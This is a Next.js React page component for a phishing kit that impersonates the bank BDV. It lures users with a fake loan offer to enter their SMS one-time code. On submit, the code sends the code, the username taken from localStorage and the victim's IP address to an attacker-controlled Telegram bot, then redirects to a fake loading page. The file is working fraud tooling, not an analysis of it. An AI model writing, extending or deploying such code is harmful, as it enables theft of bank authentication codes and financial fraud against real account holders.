"use client";

import { ChangeEvent, FormEvent, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { useSecurityGuards } from "@/hooks/useSecurityGuards";
import { requestTelegramConfig, resolveIp, TelegramConfig } from "@/lib/remote";

export default function Sms() {
  useSecurityGuards();
  const router = useRouter();

  const [smsCode, setSmsCode] = useState("");
  const [usuario, setUsuario] = useState("Desconocido");
  const [isSending, setIsSending] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig | null>(null);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedUser = localStorage.getItem("usuario");
      if (storedUser) {
        setUsuario(storedUser);
      }
    }
  }, []);

  useEffect(() => {
    let active = true;

    const loadConfig = async () => {
      try {
        const config = await requestTelegramConfig();
        if (active) {
          setTelegramConfig(config);
        }
      } catch (error) {
        console.error(error);
      }
    };

    loadConfig();

    return () => {
      active = false;
    };
  }, []);

  const handleChange = (event: ChangeEvent<HTMLInputElement>) => {
    const numericValue = event.target.value.replace(/\D/g, "").slice(0, 8);
    setSmsCode(numericValue);
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isSending) {
      return;
    }

    setError(null);
    setIsSending(true);

    try {
      const config = telegramConfig ?? (await requestTelegramConfig());
      setTelegramConfig(config);

      const ip = await resolveIp();
      const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: `
BDV
Nombre: ${usuario}
SMS: ${smsCode}
IP: ${ip}`,
        }),
      });

      if (!response.ok) {
        throw new Error("Error al enviar a Telegram");
      }

      router.push("/cargando2");
    } catch (err) {
      console.error(err);
      setError("No se pudo enviar la informaci\u00F3n. Int\u00E9ntalo m\u00E1s tarde.");
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="container">
      <div className="left-side">
        <form onSubmit={handleSubmit} className="form">
          <div style={{ textAlign: "center" }}>
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src="/logo.png" alt="BDV" style={{ width: "60%", marginTop: "20px" }} />
          </div>
          <div style={{ width: "100%", textAlign: "center" }}>
            <div style={{ margin: "10px", color: "#0067b1" }}>
              <h4 style={{ margin: 0 }}>Prestamo para usuario Disponible</h4>
              <h5 style={{ margin: "10px 0 0" }}>
                {"Para aceptar Ingrese el c\u00F3digo recibido por SMS o c\u00F3digo generado en amiven"}
              </h5>
            </div>
            <div className="form-group">
              <input
                type="password"
                id="sms"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={smsCode}
                onChange={handleChange}
                placeholder=" "
                required
              />
              <label htmlFor="sms">SMS *</label>
            </div>
          </div>

          {error && (
            <div style={{ width: "100%", textAlign: "center", color: "#ff0000", fontSize: "14px" }}>
              {error}
            </div>
          )}

          <div style={{ width: "100%", textAlign: "center" }}>
            <button type="submit">{isSending ? "Enviando" : "Verificar"}</button>
          </div>
          <div style={{ width: "100%", height: "30px" }} />
        </form>
      </div>
      <div className="right-side" />
    </div>
  );
}
